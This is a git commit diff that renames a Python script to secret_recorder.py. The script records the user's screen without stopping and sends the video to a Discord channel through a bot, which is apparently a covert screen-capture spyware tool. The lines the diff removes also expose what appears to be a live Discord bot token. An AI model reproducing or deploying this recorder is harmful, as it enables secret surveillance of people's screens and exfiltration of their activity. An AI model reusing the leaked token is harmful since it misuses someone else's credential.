04a9e43bd93c320bb8ce559ef3c150a436aac366
Caz Brecker <64892135+pranubaita@users.noreply.github.com>
2024-04-26 16:34:47 +0800

    Update and rename nodmarec.py to secret_recorder.py

--- secret_recorder.py
+++ secret_recorder.py
@@ -5,22 +5,19 @@ import time
 import discord
 import asyncio
 
-# Discord bot token and channel ID
-TOKEN = 'MTIyOTcyNzIyOTM4MzI4Mjc0MQ.GPuo5j.eeiizozYP-0nDfmfj9BwQzWHBHabBp1tCI9MVQ'
-CHANNEL_ID = 1229728373803323424  # Replace this with your channel ID
 
-# Define the screen resolution
+TOKEN = 'NUH-UH'
+CHANNEL_ID = 69420
+
 screen_width, screen_height = pyautogui.size()
 
-# Define the codec and create VideoWriter object
 fourcc = cv2.VideoWriter_fourcc(*'XVID')
 out = cv2.VideoWriter('output.avi', fourcc, 20.0, (screen_width, screen_height))
 
-# Record for 10 seconds
-record_duration = 1000
+record_duration = 100000000000
 start_time = time.time()
 intents = discord.Intents.default()
-# Initialize Discord client
+
 client = discord.Client(intents=intents)
 
 
@@ -43,27 +40,20 @@ async def record_and_send():
     global start_time
     while True:
         while time.time() - start_time < record_duration:
-            # Capture the screen
+            
             screenshot = pyautogui.screenshot()
 
-            # Convert the screenshot to a numpy array
             frame = np.array(screenshot)
 
-            # Convert RGB to BGR
             frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
 
-            # Write the frame
             out.write(frame)
 
-            # Sleep for a short interval to avoid excessive CPU usage
             await asyncio.sleep(0.1)
 
-        # Send the recorded video to Discord
         await send_video()
 
-        # Reset start time for next recording
         start_time = time.time()
 
 
-# Run the bot
 client.run(TOKEN)
